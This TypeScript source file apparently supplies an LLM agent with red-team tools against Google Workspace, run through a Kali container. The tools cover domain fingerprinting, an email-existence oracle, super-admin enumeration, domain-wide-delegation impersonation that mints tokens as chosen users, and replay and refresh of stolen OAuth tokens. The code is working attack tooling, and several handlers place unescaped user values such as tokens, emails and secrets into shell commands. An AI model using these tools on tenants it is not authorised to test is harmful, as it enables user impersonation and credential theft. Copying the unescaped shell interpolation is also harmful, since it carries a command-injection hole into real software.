import { executeInKali } from "../utils/docker-exec";
import { getHandlerContext } from "../scope/handler-context";
import { resolveCredentialRef } from "../scope/identity-credentials-loader";

// Resolve the effective SA-key path + delegated subject for a Google Workspace
// tool call. Explicit args always win (backward compatible): an explicit
// gws_sa_key_ref that already looks like a filesystem path is used as-is. When
// no usable path arg is given, fall back to the in-scope identity_target from
// the handler context — resolving its named `sa_key_ref` credential to the
// actual SA-key JSON path (kind: sa_json → cred.path) and using its
// `delegated_subject`. So the LLM agent need not pass the path/subject at all.
async function resolveGwsCreds(args: {
  gws_sa_key_ref?: string;
  gws_delegated_subject?: string;
}): Promise<{ saKeyPath?: string; delegatedSubject?: string }> {
  const target = getHandlerContext().identity_target;

  // SA-key path: an explicit ref that's already a path wins; otherwise resolve
  // the target's named sa_key_ref → cred.path.
  let saKeyPath: string | undefined;
  if (args.gws_sa_key_ref && args.gws_sa_key_ref.startsWith("/")) {
    saKeyPath = args.gws_sa_key_ref;
  } else if (target?.sa_key_ref) {
    const cred = await resolveCredentialRef(target.sa_key_ref);
    if (cred?.path) saKeyPath = cred.path as string;
  } else if (args.gws_sa_key_ref) {
    // A non-path explicit ref name — try resolving it as a credential ref too.
    const cred = await resolveCredentialRef(args.gws_sa_key_ref);
    if (cred?.path) saKeyPath = cred.path as string;
  }

  const delegatedSubject =
    args.gws_delegated_subject || target?.delegated_subject || undefined;

  return { saKeyPath, delegatedSubject };
}

// =============================================================================
// IDENTITY — Google Workspace (Google Identity / Cloud Identity) tools
//
// Authorized red-team module for Google Workspace identity infrastructure that
// customers explicitly authorize (same engagement model as identity-entra.ts /
// identity-ad.ts). Mirrors those modules' structure exactly:
//   - `identityGoogleTools`    : MCP tool definitions (name, description, inputSchema)
//   - `identityGoogleHandlers` : Record<string, Function> shelling out via executeInKali
//
// CLOUD W1b LESSON (applied at design time): every handler runs a
// `command -v <tool>` preflight (INSTALLED / NOT INSTALLED) and uses `2>&1`
// (NOT `2>/dev/null`) so a packaging gap is never silently mistaken for an auth
// failure, and real tool errors surface in the output.
//
// AUTH SURFACE (per tool, as needed):
//   - gws_domain            : primary domain (drives unauth fingerprint + OIDC)
//   - gws_customer_id       : Google Workspace customer id (Cloud Identity)
//   - gws_sa_key_ref        : reference to a service-account JSON key (NOT inlined;
//                             a path/secret-ref the container resolves)
//   - gws_delegated_subject : the user a domain-wide-delegation SA impersonates
//   - gws_oauth_token       : an OAuth access/refresh token for replay
//
// The Admin SDK / OAuth flows are driven via python3 + google-api-python-client
// when a SA key is supplied; that stack may not be installed in the image, so a
// preflight for python3 / the google client lib is emitted and every such path
// soft-fails gracefully. curl + jq handle the unauthenticated + raw-token paths.
//
// Every tool's first required arg is `tenant_id` (the Google Workspace customer
// id or primary domain) so the parent scope validator pins it to the in-scope
// Google tenant (the identity analog of cloud's `cloud_account_id`).
//
// NON-DESTRUCTIVE DEFAULTS (.claude/agents/_preamble.md): enumerate, prove
// access, replay tokens read-only. Every state-changing path is gated behind an
// explicit `attempt_*: boolean` defaulting to FALSE. Auth probing is
// lockout-aware and fail-closed — these tools never lock accounts.
// =============================================================================

// Shell-escape a value for safe single-quoted embedding in a bash command.
// Wraps in single quotes and escapes embedded single quotes via '\''.
function sq(value: string): string {
  return `'${String(value).replace(/'/g, `'\\''`)}'`;
}

// Build the standard tool-availability preflight line (cloud W1b lesson).
function preflight(tool: string, versionFlag = "--version"): string {
  return `command -v ${tool} >/dev/null 2>&1 && echo "${tool}: INSTALLED ($(${tool} ${versionFlag} 2>&1 | head -1))" || echo "${tool}: NOT INSTALLED"`;
}

// Preflight for the Admin SDK python stack (may be absent — soft-fail gracefully).
// python3 + google-api-python-client are used for any SA-key / Directory-API path.
function preflightGoogleApiPython(): string {
  return `python3 -c "import googleapiclient; print('google-api-python-client: INSTALLED', googleapiclient.__version__)" 2>&1 || echo "google-api-python-client: NOT INSTALLED (python3 + google-api-python-client needed for Admin SDK paths — soft-fail)"`;
}

export const identityGoogleTools = [
  // ===========================================================================
  // RECON
  // ===========================================================================
  {
    name: "enum_gworkspace_domain",
    description:
      "[GOOGLE WORKSPACE RECON — no auth] Unauthenticated domain fingerprint: MX records (Google MX = Workspace tenant), SPF/DKIM/DMARC posture, the accounts.google.com domain/realm probe, Google Hosted Services (GHS) CNAME footprint, and the Google OpenID Connect .well-known config. No authentication required.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Google Workspace customer id or primary domain for scope validation",
        },
        gws_domain: {
          type: "string",
          description: "Primary domain to fingerprint (e.g. corp.com) — defaults to tenant_id if it is a domain",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "enum_gworkspace_users",
    description:
      "[GOOGLE WORKSPACE RECON — SA key OR no auth] Directory user enumeration: with a service-account key + delegated subject, lists users via the Admin SDK Directory API (users.list); without a key, performs an email-validity existence oracle against Google's account endpoints. Recon only — no password attempts.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Google Workspace customer id or primary domain for scope validation",
        },
        gws_domain: {
          type: "string",
          description: "Domain to enumerate users within (e.g. corp.com)",
        },
        gws_customer_id: {
          type: "string",
          description: "Google Workspace customer id (e.g. C0xxxxxxx) for the Directory API customer scope",
        },
        gws_sa_key_ref: {
          type: "string",
          description: "Reference (in-container path / secret-ref) to the service-account JSON key — referenced, never inlined",
        },
        gws_delegated_subject: {
          type: "string",
          description: "Super-admin email the SA impersonates via domain-wide delegation for Directory API reads",
        },
        userlist: {
          type: "array",
          items: { type: "string" },
          description: "Candidate emails to test for existence when no SA key is supplied",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "enum_gworkspace_admin_roles",
    description:
      "[GOOGLE WORKSPACE RECON — needs SA key + delegated admin] Super Admin / delegated-admin / privileged-role enumeration via the Admin SDK Directory API (roles.list + roleAssignments.list): maps every account holding SUPER_ADMIN, GROUPS_ADMIN, USER_MANAGEMENT_ADMIN, or a custom privileged role. Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Google Workspace customer id or primary domain for scope validation",
        },
        gws_customer_id: {
          type: "string",
          description: "Google Workspace customer id (e.g. C0xxxxxxx) for the Directory API customer scope",
        },
        gws_sa_key_ref: {
          type: "string",
          description: "Reference (in-container path / secret-ref) to the service-account JSON key — referenced, never inlined",
        },
        gws_delegated_subject: {
          type: "string",
          description: "Super-admin email the SA impersonates for role enumeration",
        },
      },
      required: ["tenant_id"],
    },
  },

  // ===========================================================================
  // ABUSE / EXPLOITATION
  // ===========================================================================
  {
    name: "abuse_gworkspace_oauth",
    description:
      "[GOOGLE WORKSPACE EXPLOIT — needs SA key — non-destructive default] OAuth app + DOMAIN-WIDE DELEGATION abuse analysis (the high-impact Google Workspace path: a service account granted domain-wide delegation can impersonate ANY user in the tenant). Default ANALYZES the delegation surface — enumerates the SA's authorized scopes and the impersonation reach. Gated attempt_impersonate=true actually mints a delegated token AS gws_delegated_subject and reads that user's profile (read-only) to PROVE impersonation. Never resets/creates resources.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Google Workspace customer id or primary domain for scope validation",
        },
        gws_domain: {
          type: "string",
          description: "Primary domain of the tenant (for scope context)",
        },
        gws_sa_key_ref: {
          type: "string",
          description: "Reference (in-container path / secret-ref) to the service-account JSON key whose delegation is being analyzed — referenced, never inlined",
        },
        gws_delegated_subject: {
          type: "string",
          description: "The user the SA would impersonate via domain-wide delegation (the proof target when attempt_impersonate=true)",
        },
        scopes: {
          type: "array",
          items: { type: "string" },
          description: "OAuth scopes to analyze/request for the delegation (e.g. ['https://www.googleapis.com/auth/admin.directory.user.readonly'])",
        },
        attempt_impersonate: {
          type: "boolean",
          description: "Actually mint a delegated token AS gws_delegated_subject and read that user's profile to prove impersonation (read-only). Default FALSE = analyze the delegation surface + scopes only.",
          default: false,
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "test_gworkspace_saml",
    description:
      "[GOOGLE WORKSPACE EXPLOIT — analysis] SAML/SSO config + signature-weakness analysis: fetches the Google SP metadata and (when supplied) the third-party IdP federation metadata, then checks for golden-SAML-class weaknesses (unsigned assertions accepted, weak signature algorithms, missing audience/recipient restriction, long-lived assertion windows). Non-destructive — fetch + parse only, no forged assertion is submitted.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Google Workspace customer id or primary domain for scope validation",
        },
        gws_domain: {
          type: "string",
          description: "Primary domain whose SSO/SAML config is being analyzed",
        },
        idp_metadata_url: {
          type: "string",
          description: "Optional third-party IdP SAML metadata URL to fetch and analyze for signature/federation weaknesses",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "test_gworkspace_token",
    description:
      "[GOOGLE WORKSPACE EXPLOIT — read-only] OAuth refresh/access token replay: replays a supplied (brokered/stolen) Google OAuth token against the tokeninfo endpoint and a read-only userinfo/Directory call to prove the token is live and enumerate its granted scopes. Gated attempt_refresh=true exchanges a refresh token for a fresh access token to test rotation. Read-only — never writes.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Google Workspace customer id or primary domain for scope validation",
        },
        gws_oauth_token: {
          type: "string",
          description: "The OAuth access token to replay (brokered/stolen)",
        },
        refresh_token: {
          type: "string",
          description: "Optional OAuth refresh token to test rotation when attempt_refresh=true",
        },
        client_id: {
          type: "string",
          description: "OAuth client id used to issue the token (required to exchange a refresh token)",
        },
        client_secret: {
          type: "string",
          description: "OAuth client secret paired with client_id for the refresh exchange (brokered, short-lived)",
        },
        attempt_refresh: {
          type: "boolean",
          description: "Exchange the refresh_token for a fresh access token to test rotation. Default FALSE = replay the access token read-only only.",
          default: false,
        },
      },
      required: ["tenant_id", "gws_oauth_token"],
    },
  },
];

export const identityGoogleHandlers: Record<string, Function> = {
  // ===========================================================================
  // RECON
  // ===========================================================================
  enum_gworkspace_domain: async (args: {
    tenant_id: string;
    gws_domain?: string;
  }) => {
    const { tenant_id, gws_domain } = args;
    const domain = gws_domain || tenant_id;

    const commands: string[] = [
      `echo "=== Google Workspace Domain Fingerprint (unauthenticated) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Domain: ${domain}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("dig", "-v"),
      preflight("jq"),
      `echo ""`,
      `echo "--- MX records (Google MX => Workspace tenant) ---"`,
      `dig +short MX ${sq(domain)} 2>&1 || echo "MX lookup FAILED"`,
      `echo ""`,
      `echo "--- SPF (TXT, include:_spf.google.com indicates Workspace) ---"`,
      `dig +short TXT ${sq(domain)} 2>&1 | grep -i "v=spf1" || echo "no SPF record / SPF lookup FAILED"`,
      `echo ""`,
      `echo "--- DMARC (_dmarc TXT) ---"`,
      `dig +short TXT ${sq(`_dmarc.${domain}`)} 2>&1 || echo "DMARC lookup FAILED"`,
      `echo ""`,
      `echo "--- DKIM (google selector) ---"`,
      `dig +short TXT ${sq(`google._domainkey.${domain}`)} 2>&1 || echo "DKIM google selector lookup FAILED"`,
      `echo ""`,
      `echo "--- Google Hosted Services (GHS) CNAME footprint ---"`,
      `dig +short CNAME ${sq(`mail.${domain}`)} 2>&1 || echo "GHS CNAME lookup FAILED"`,
      `echo ""`,
      `echo "--- accounts.google.com domain/realm probe (hosted-domain hint) ---"`,
      `curl -sS "https://accounts.google.com/.well-known/openid-configuration" 2>&1 | jq -r '.issuer, .authorization_endpoint, .token_endpoint' 2>&1 | head -c 4000 || echo "OIDC discovery probe FAILED"`,
      `echo ""`,
      `echo "--- Google OpenID Connect .well-known config (raw) ---"`,
      `curl -sS "https://accounts.google.com/.well-known/openid-configuration" 2>&1 | head -c 8000 || echo "OIDC config request FAILED"`,
      `echo ""`,
      `echo "--- Hosted-domain login hint (GSuite/Workspace SSO redirect) ---"`,
      `curl -sS -o /dev/null -w "HTTP %{http_code} -> %{redirect_url}\\n" "https://www.google.com/a/${domain}/ServiceLogin" 2>&1 || echo "hosted-domain ServiceLogin probe FAILED"`,
      `echo ""`,
      `echo "=== Google Workspace Domain Fingerprint Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_gworkspace_users: async (args: {
    tenant_id: string;
    gws_domain?: string;
    gws_customer_id?: string;
    gws_sa_key_ref?: string;
    gws_delegated_subject?: string;
    userlist?: string[];
  }) => {
    const {
      tenant_id,
      gws_domain,
      gws_customer_id,
      userlist = [],
    } = args;
    const domain = gws_domain || tenant_id;
    const { saKeyPath, delegatedSubject } = await resolveGwsCreds(args);

    const commands: string[] = [
      `echo "=== Google Workspace User Enumeration ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Domain: ${domain}"`,
      `echo "Mode: ${saKeyPath ? "Admin SDK Directory API (SA key)" : "email-validity existence oracle"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("python3", "--version"),
      preflightGoogleApiPython(),
      `echo ""`,
    ];

    if (saKeyPath && delegatedSubject) {
      // Admin SDK Directory API path (users.list) via google-api-python-client.
      commands.push(`echo "--- Admin SDK Directory API users.list (SA key + delegated subject) ---"`);
      const py = [
        "import sys, json",
        "from google.oauth2 import service_account",
        "from googleapiclient.discovery import build",
        `creds = service_account.Credentials.from_service_account_file(${JSON.stringify(saKeyPath)}, scopes=['https://www.googleapis.com/auth/admin.directory.user.readonly'])`,
        `dc = creds.with_subject(${JSON.stringify(delegatedSubject)})`,
        "svc = build('admin', 'directory_v1', credentials=dc)",
        gws_customer_id
          ? `resp = svc.users().list(customer=${JSON.stringify(gws_customer_id)}, maxResults=500).execute()`
          : `resp = svc.users().list(domain=${JSON.stringify(domain)}, maxResults=500).execute()`,
        "users = resp.get('users', [])",
        "print('USERS_FOUND', len(users))",
        "[print(u.get('primaryEmail'), '|', u.get('isAdmin'), '|', u.get('suspended')) for u in users]",
      ].join("; ");
      commands.push(
        `python3 -c ${sq(py)} 2>&1 | head -c 30000 || echo "Admin SDK users.list FAILED (see stderr above; auth/delegation vs library-not-installed)"`
      );
      commands.push(`echo ""`);
    } else if (userlist.length > 0) {
      // Email-validity existence oracle (no auth) against Google's account endpoint.
      commands.push(`echo "--- Email-validity existence oracle (${userlist.length} candidates, no auth) ---"`);
      for (const email of userlist) {
        commands.push(
          `echo "[probe] ${email}:" && curl -sS -o /dev/null -w "HTTP %{http_code}\\n" "https://accounts.google.com/_/signin/sl/lookup?hl=en&_reqid=1&rt=j" --data-urlencode "f.req=[\\"${email}\\"]" 2>&1 || echo "existence probe for ${email} FAILED"`
        );
      }
      commands.push(`echo ""`);
      commands.push(`echo "NOTE: existence-oracle responses are heuristic; confirm with the Directory API path when a SA key is available."`);
    } else {
      commands.push(`echo "No SA key (+delegated subject) and no userlist supplied — nothing to enumerate. Provide gws_sa_key_ref+gws_delegated_subject for authenticated Directory enumeration, or userlist for the existence oracle."`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Google Workspace User Enumeration Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  enum_gworkspace_admin_roles: async (args: {
    tenant_id: string;
    gws_customer_id?: string;
    gws_sa_key_ref?: string;
    gws_delegated_subject?: string;
  }) => {
    const { tenant_id, gws_customer_id } = args;
    const { saKeyPath, delegatedSubject } = await resolveGwsCreds(args);

    const commands: string[] = [
      `echo "=== Google Workspace Admin / Privileged-Role Enumeration ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Customer: ${gws_customer_id || "(my_customer)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("python3", "--version"),
      preflightGoogleApiPython(),
      `echo ""`,
    ];

    if (saKeyPath && delegatedSubject) {
      commands.push(`echo "--- Admin SDK roles.list + roleAssignments.list (SA key + delegated admin) ---"`);
      const customer = gws_customer_id || "my_customer";
      const py = [
        "import sys",
        "from google.oauth2 import service_account",
        "from googleapiclient.discovery import build",
        `creds = service_account.Credentials.from_service_account_file(${JSON.stringify(saKeyPath)}, scopes=['https://www.googleapis.com/auth/admin.directory.rolemanagement.readonly'])`,
        `dc = creds.with_subject(${JSON.stringify(delegatedSubject)})`,
        "svc = build('admin', 'directory_v1', credentials=dc)",
        `roles = svc.roles().list(customer=${JSON.stringify(customer)}).execute().get('items', [])`,
        "print('ROLES_FOUND', len(roles))",
        "[print('ROLE', r.get('roleId'), r.get('roleName'), 'super=' + str(r.get('isSuperAdminRole'))) for r in roles]",
        `asn = svc.roleAssignments().list(customer=${JSON.stringify(customer)}).execute().get('items', [])`,
        "print('ASSIGNMENTS_FOUND', len(asn))",
        "[print('ASSIGN', a.get('assignedTo'), '->', a.get('roleId'), '@', a.get('scopeType')) for a in asn]",
      ].join("; ");
      commands.push(
        `python3 -c ${sq(py)} 2>&1 | head -c 30000 || echo "Admin SDK role enumeration FAILED (see stderr above; auth/delegation vs library-not-installed)"`
      );
    } else {
      commands.push(`echo "Admin-role enumeration requires gws_sa_key_ref + gws_delegated_subject (a delegated super-admin). Not supplied — nothing to enumerate."`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Google Workspace Admin Role Enumeration Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  // ===========================================================================
  // ABUSE / EXPLOITATION
  // ===========================================================================
  abuse_gworkspace_oauth: async (args: {
    tenant_id: string;
    gws_domain?: string;
    gws_sa_key_ref?: string;
    gws_delegated_subject?: string;
    scopes?: string[];
    attempt_impersonate?: boolean;
  }) => {
    const {
      tenant_id,
      gws_domain,
      scopes = [],
      attempt_impersonate = false,
    } = args;
    const { saKeyPath, delegatedSubject } = await resolveGwsCreds(args);

    const commands: string[] = [
      `echo "=== Google Workspace OAuth / Domain-Wide Delegation Abuse ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Domain: ${gws_domain || tenant_id}"`,
      `echo "Delegated subject (impersonation target): ${delegatedSubject || "(none)"}"`,
      `echo "Requested scopes: ${scopes.join(", ") || "(none specified)"}"`,
      `echo "Attempt impersonation (mint delegated token): ${attempt_impersonate}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("python3", "--version"),
      preflightGoogleApiPython(),
      `echo ""`,
    ];

    if (!saKeyPath) {
      commands.push(`echo "No gws_sa_key_ref supplied — cannot analyze the domain-wide-delegation surface. Provide the SA key reference."`);
      commands.push(`echo ""`);
      commands.push(`echo "=== Google Workspace OAuth Abuse Complete ==="`);
      return await executeInKali(commands.join(" && "));
    }

    // Always analyze the delegation surface (read-only): SA identity + client_id +
    // the scopes that would be authorized. This is the high-impact insight even
    // without minting a token.
    commands.push(`echo "--- DELEGATION SURFACE ANALYSIS (read-only) ---"`);
    const analyzePy = [
      "import json",
      `d = json.load(open(${JSON.stringify(saKeyPath)}))`,
      "print('SA client_email :', d.get('client_email'))",
      "print('SA client_id    :', d.get('client_id'))",
      "print('SA project_id   :', d.get('project_id'))",
      "print('NOTE: the SA client_id above is what must be authorized for domain-wide delegation in the Admin console (Security > API controls).')",
      "print('If this client_id holds DWD with broad scopes, it can impersonate ANY user in the tenant.')",
    ].join("; ");
    commands.push(
      `python3 -c ${sq(analyzePy)} 2>&1 | head -c 8000 || echo "SA key analysis FAILED (see stderr above; key-ref missing/invalid vs python3 missing)"`
    );
    commands.push(`echo ""`);

    if (!attempt_impersonate) {
      commands.push(`echo "GATED: attempt_impersonate=false — delegation surface analyzed only, no token minted."`);
      commands.push(`echo "Set attempt_impersonate=true (with gws_delegated_subject) to mint a delegated token and read that user's profile read-only to PROVE impersonation."`);
    } else if (!delegatedSubject) {
      commands.push(`echo "attempt_impersonate=true but no gws_delegated_subject supplied — nothing to impersonate."`);
    } else {
      commands.push(`echo "--- IMPERSONATION PROOF: mint delegated token AS ${delegatedSubject}, read profile (read-only) ---"`);
      const impScopes = scopes.length
        ? scopes
        : ["https://www.googleapis.com/auth/admin.directory.user.readonly"];
      const py = [
        "from google.oauth2 import service_account",
        "from googleapiclient.discovery import build",
        `creds = service_account.Credentials.from_service_account_file(${JSON.stringify(saKeyPath)}, scopes=${JSON.stringify(impScopes)})`,
        `dc = creds.with_subject(${JSON.stringify(delegatedSubject)})`,
        "svc = build('admin', 'directory_v1', credentials=dc)",
        `u = svc.users().get(userKey=${JSON.stringify(delegatedSubject)}).execute()`,
        "print('IMPERSONATION_PROVEN as', u.get('primaryEmail'))",
        "print('  isAdmin   :', u.get('isAdmin'))",
        "print('  isDelegatedAdmin:', u.get('isDelegatedAdmin'))",
        "print('  orgUnit   :', u.get('orgUnitPath'))",
        "print('  lastLogin :', u.get('lastLoginTime'))",
      ].join("; ");
      commands.push(
        `python3 -c ${sq(py)} 2>&1 | head -c 15000 || echo "Delegated impersonation FAILED (see stderr above; DWD not granted / scope not authorized vs library-not-installed) — mark PARTIAL"`
      );
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Google Workspace OAuth Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  test_gworkspace_saml: async (args: {
    tenant_id: string;
    gws_domain?: string;
    idp_metadata_url?: string;
  }) => {
    const { tenant_id, gws_domain, idp_metadata_url } = args;
    const domain = gws_domain || tenant_id;

    const commands: string[] = [
      `echo "=== Google Workspace SAML / SSO Config Analysis ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Domain: ${domain}"`,
      `echo "Third-party IdP metadata: ${idp_metadata_url || "(none supplied)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("xmllint", "--version"),
      `echo ""`,
      `echo "--- Google SP SAML metadata (the Google Workspace service-provider side) ---"`,
      `curl -sS "https://accounts.google.com/o/saml2/idp?idpid=${domain}" 2>&1 | head -c 8000 || echo "Google SP metadata fetch FAILED (domain may not use SAML SSO)"`,
      `echo ""`,
    ];

    if (idp_metadata_url) {
      commands.push(`echo "--- Third-party IdP federation metadata (fetch + parse) ---"`);
      commands.push(
        `curl -sS ${sq(idp_metadata_url)} 2>&1 | tee /tmp/gws-idp-metadata.xml | head -c 12000 || echo "IdP metadata fetch FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- Golden-SAML-class signature-weakness checks ---"`);
      // Read-only static checks against the fetched metadata. No assertion is forged/submitted.
      commands.push(
        `grep -i "WantAssertionsSigned" /tmp/gws-idp-metadata.xml 2>&1 | head -5 || echo "WantAssertionsSigned: NOT FOUND (unsigned assertions may be accepted — golden-SAML risk)"`
      );
      commands.push(
        `grep -iE "rsa-sha1|sha1" /tmp/gws-idp-metadata.xml 2>&1 | head -5 || echo "No SHA-1 signature algorithm reference found (good)"`
      );
      commands.push(
        `grep -i "X509Certificate" /tmp/gws-idp-metadata.xml 2>&1 | head -c 2000 || echo "No signing certificate in metadata (verify signature trust anchor)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "NOTE: signature checks are read-only metadata analysis. No forged assertion is submitted (golden-SAML PoC = forge with the IdP signing key, which is gated/out-of-band)."`);
    } else {
      commands.push(`echo "No idp_metadata_url supplied — Google SP metadata fetched above. Provide the third-party IdP metadata URL to analyze federation signature posture."`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Google Workspace SAML Analysis Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  test_gworkspace_token: async (args: {
    tenant_id: string;
    gws_oauth_token: string;
    refresh_token?: string;
    client_id?: string;
    client_secret?: string;
    attempt_refresh?: boolean;
  }) => {
    const {
      tenant_id,
      gws_oauth_token,
      refresh_token,
      client_id,
      client_secret,
      attempt_refresh = false,
    } = args;

    const commands: string[] = [
      `echo "=== Google Workspace OAuth Token Replay (read-only) ==="`,
      `echo "Tenant: ${tenant_id}"`,
      `echo "Attempt refresh exchange: ${attempt_refresh}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
      `echo "--- tokeninfo (prove token live + enumerate granted scopes) ---"`,
      `curl -sS "https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=${gws_oauth_token}" 2>&1 | head -c 6000 || echo "tokeninfo request FAILED (see stderr above; token expired/invalid)"`,
      `echo ""`,
      `echo "--- userinfo replay (read-only identity proof) ---"`,
      `curl -sS -H "Authorization: Bearer ${gws_oauth_token}" "https://www.googleapis.com/oauth2/v3/userinfo" 2>&1 | head -c 6000 || echo "userinfo replay FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Directory me-context replay (read-only, if directory scope present) ---"`,
      `curl -sS -H "Authorization: Bearer ${gws_oauth_token}" "https://admin.googleapis.com/admin/directory/v1/users?customer=my_customer&maxResults=5" 2>&1 | head -c 8000 || echo "Directory replay FAILED (token may lack directory scope)"`,
      `echo ""`,
    ];

    if (attempt_refresh && refresh_token && client_id && client_secret) {
      commands.push(`echo "--- Refresh-token rotation test (exchange for fresh access token) ---"`);
      commands.push(
        `curl -sS -X POST "https://oauth2.googleapis.com/token" -d "client_id=${client_id}" -d "client_secret=${client_secret}" -d "refresh_token=${refresh_token}" -d "grant_type=refresh_token" 2>&1 | head -c 6000 || echo "refresh exchange FAILED (see stderr above)"`
      );
    } else if (attempt_refresh) {
      commands.push(`echo "attempt_refresh=true but refresh_token + client_id + client_secret are all required for the exchange — one is missing. Skipping refresh."`);
    } else {
      commands.push(`echo "Refresh-token exchange skipped (attempt_refresh=false)."`);
    }

    commands.push(`echo ""`);
    commands.push(`echo "=== Google Workspace OAuth Token Replay Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },
};
